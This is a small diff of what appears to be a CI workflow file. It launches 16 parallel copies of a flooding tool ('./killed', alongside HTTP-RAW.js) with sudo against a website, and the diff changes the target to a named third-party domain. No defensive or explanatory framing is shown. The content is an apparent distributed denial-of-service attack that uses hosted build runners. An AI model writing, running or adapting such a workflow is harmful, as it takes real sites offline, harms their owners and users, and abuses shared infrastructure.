@@ -18,7 +18,7 @@ jobs:
           chmod +x HTTP-RAW.js
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 40 ./killed GET https://repo.estranged-tech.top/ fres.txt 40 900 6 &
+            sudo timeout 40 ./killed GET https://odakteknoloji.com.tr/ fres.txt 40 900 6 &
             PIDS+=($!)
           done
           
